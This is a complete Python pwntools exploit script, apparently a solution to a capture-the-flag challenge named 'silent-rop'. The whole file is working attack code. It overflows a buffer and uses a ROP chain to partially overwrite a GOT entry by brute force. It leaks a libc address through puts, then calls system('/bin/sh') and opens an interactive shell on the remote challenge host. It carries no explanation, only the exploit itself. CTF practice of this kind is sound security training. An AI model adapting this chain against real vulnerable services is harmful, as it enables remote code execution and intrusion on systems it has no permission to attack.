#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./silent-rop')

while True:
	if args.REMOTE:
		p = remote('ctf.k3rn3l4rmy.com', 2202)
		libc = ELF('libc.so.6', checksec=False)
	else:
		p = process(binary.path)
		libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)

	payload  = b''
	payload += 0x1c * b'A'
	payload += p32(binary.plt.read)
	payload += p32(binary.sym.vuln)
	payload += p32(0)
	payload += p32(binary.got.setvbuf)
	payload += p32(2)
	payload += (0xd8 - len(payload)) * b'\0'

	p.send(payload)
	p.send(p16((libc.sym.puts & 0xFFF) | 0x6000))

	payload  = b''
	payload += 0x1c * b'A'
	payload += p32(binary.plt.setvbuf)
	payload += p32(binary.sym.vuln)
	payload += p32(binary.got.setvbuf)
	payload += (0xd8 - len(payload)) * b'\0'

	p.send(payload)
	try:
		_ = p.recv(4)
	except:
		p.close()
		continue

	break

libc.address = u32(_) - libc.sym.puts
log.info('libc.address = {x}'.format(x = hex(libc.address)))

payload  = b''
payload += 0x1c * b'A'
payload += p32(libc.sym.system)
payload += p32(0)
payload += p32(libc.search(b'/bin/sh').__next__())
payload += (0xd8 - len(payload)) * b'\0'

p.send(payload)
p.interactive()
